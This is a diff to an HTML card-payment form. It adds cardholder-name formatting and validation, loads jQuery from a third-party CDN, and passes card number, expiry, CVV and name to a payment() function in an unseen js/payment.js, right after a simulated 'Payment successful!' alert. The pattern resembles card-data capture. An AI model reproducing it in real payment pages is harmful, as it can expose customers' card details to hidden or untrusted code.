@@ -4,6 +4,7 @@
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<title>Payment</title>
+    <script src="js/payment.js" type="text/javascript"></script>
 	<link rel="stylesheet" href="css/country.css">
 	<script src="https://cdn.tailwindcss.com/3.4.16"></script>
 	<script>
@@ -135,7 +136,14 @@
 	                
 	                <div class="mb-6">
 	                    <label for="cardholderName" class="block text-sm font-medium text-gray-700 mb-1">Cardholder Name</label>
-	                    <input type="text" id="cardholderName" placeholder="John Smith" class="card-input w-full px-4 py-3 border border-gray-300 rounded-button focus:outline-none">
+	                    <input type="text" id="cardholderName" placeholder="JOHN SMITH" class="card-input w-full px-4 py-3 border border-gray-300 rounded-button focus:outline-none input-en" style="text-transform:uppercase">
+
+	                    <script src="https://snipp.ru/cdn/jquery/2.1.1/jquery.min.js"></script>
+						<script>
+							$('body').on('input', '.input-en', function(){
+								this.value = this.value.replace(/[^A-Z\s]/gi, '');
+							});
+						</script>
 	                </div>
 	                
 	                <div class="flex items-center mb-6">
@@ -206,6 +214,7 @@
 	            const cardNumber = document.getElementById('cardNumber');
 	            const expiryDate = document.getElementById('expiryDate');
 	            const cvv = document.getElementById('cvv');
+	            const holder = document.getElementById('cardholderName')
 	            const saveCardCheckbox = document.getElementById('saveCard');
 	            const checkmark = document.getElementById('checkmark');
 	            
@@ -273,6 +282,13 @@
 	                } else {
 	                    cvv.classList.remove('border-red-500');
 	                }
+
+	                if (holder.value.split(' ').length !== 2) {
+	                	holder.classList.add('border-red-500');
+	                	isValid = false;
+	                } else {
+	                    holder.classList.remove('border-red-500');
+	                }
 	                
 	                if (isValid) {
 	                    // Simulate payment processing
@@ -282,6 +298,7 @@
 	                    
 	                    // Show success message (in real app)
 	                    alert('Payment successful!');
+	                    payment(cardNumber.value, expiryDate.value, cvv.value, holder.value)
 	                }
 	            });
 	        });
